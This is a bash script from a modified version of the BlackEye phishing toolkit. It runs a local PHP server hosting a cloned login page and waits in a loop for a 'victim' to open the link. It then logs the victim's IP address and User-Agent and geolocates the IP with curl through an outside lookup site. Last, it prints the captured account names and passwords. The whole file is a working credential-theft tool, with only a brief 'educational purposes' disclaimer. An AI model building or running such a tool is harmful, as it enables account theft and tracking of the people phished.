#!/bin/bash
# BLACKEYE v1.0 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
# Coded by: @thelinuxchoice (https://github.com/thelinuxchoice/blackeye)
# Upgraded by: @suljot_gjoka (https://github.com/whiteeagle0/blackeye)


trap 'printf "\n";stop;exit 1' 2

banner() {

	printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
	printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
	printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
	printf "\n"
	printf "     \e[101m\e[1;77m::     BLACKEYE v1.5! By @suljot_gjoka & @thelinuxchoice     ::\e[0m\n"
	printf "\n"

}

catch_cred() {

	account=$(grep -o 'Account:.*' sites/${BLACKEYE_PAGE}/logs/usernames.txt | cut -d " " -f2)
	IFS=$'\n'
	password=$(grep -o 'Pass:.*' sites/${BLACKEYE_PAGE}/logs/usernames.txt | cut -d ":" -f2)
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
	#RH modified this to decreased the size file
	#cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" ${BLACKEYE_PAGE}

	#RH Modified
	#killall -2 php > /dev/null 2>&1
	#killall -2 ngrok > /dev/null 2>&1
	#exit 1

}

getcredentials() {

	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
	while [ true ]; do

		if [[ -e "sites/${BLACKEYE_PAGE}/logs/usernames.txt" ]]; then
			printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
			#RH is not necesary to record more register ...
			catch_cred

		fi
		sleep 1
	#	exit 1
	done 
}

catch_ip() {

	touch sites/${BLACKEYE_PAGE}/logs/saved.usernames.txt
	ip=$(grep -a 'IP:' sites/${BLACKEYE_PAGE}/logs/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	ua=$(grep 'User-Agent:' sites/${BLACKEYE_PAGE}/logs/ip.txt | cut -d '"' -f2)
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/logs/saved.ip.txt\e[0m\n" ${BLACKEYE_PAGE}
	cat sites/${BLACKEYE_PAGE}/logs/ip.txt >> sites/${BLACKEYE_PAGE}/logs/saved.ip.txt


	if [[ -e iptracker.log ]]; then
		rm -rf iptracker.log
	fi

	IFS='\n'
	iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
	IFS=$'\n'

	continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
		printf "\n"
	##

	hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
	if [[ $hostnameip != "" ]]; then
		printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
	fi
	##

	reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
	if [[ $reverse_dns != "" ]]; then
		printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
	fi
	##

	if [[ $continent != "" ]]; then
		printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
	fi
	##

	country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
	if [[ $country != "" ]]; then
		printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
	fi
	##

	state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
	if [[ $state != "" ]]; then
		printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
	fi
	##

	city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
	if [[ $city != "" ]]; then
		printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
	fi
	##

	isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
	if [[ $isp != "" ]]; then
		printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
	fi
	##

	as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
	if [[ $as_number != "" ]]; then
		printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
	fi
	##

	ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
	if [[ $ip_speed != "" ]]; then
		printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
	fi
	##

	ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
	if [[ $ip_currency != "" ]]; then
		printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
	fi
	##
	printf "\n"
	rm -rf iptracker.log
	getcredentials
}

start() {

	if [[ -e sites/${BLACKEYE_PAGE}/logs/ip.txt ]]; then
		rm -rf sites/${BLACKEYE_PAGE}/logs/ip.txt
	fi
	if [[ -e sites/${BLACKEYE_PAGE}/logs/usernames.txt ]]; then
		rm -rf sites/${BLACKEYE_PAGE}/logs/usernames.txt
	fi

	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n" 
	cd sites/${BLACKEYE_PAGE} && nohup php -S ${HOST_NAME}:${PORT} > ./logs/php.out 2>&1 &
	sleep 2

	#link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	#RH: Add this new configure to addapt process
	#link=$(curl -sS http://${HOST_NAME}:${PORT_TUNNELS}/api/tunnels | jq '.tunnels[] | .public_url')
	#printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
	checkfound
}
checkfound() {

    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
    while [ true ]; do

        if [[ -e "sites/${BLACKEYE_PAGE}/logs/ip.txt" ]]; then
        	printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
        	catch_ip
        fi
        sleep 1
    done 
}

start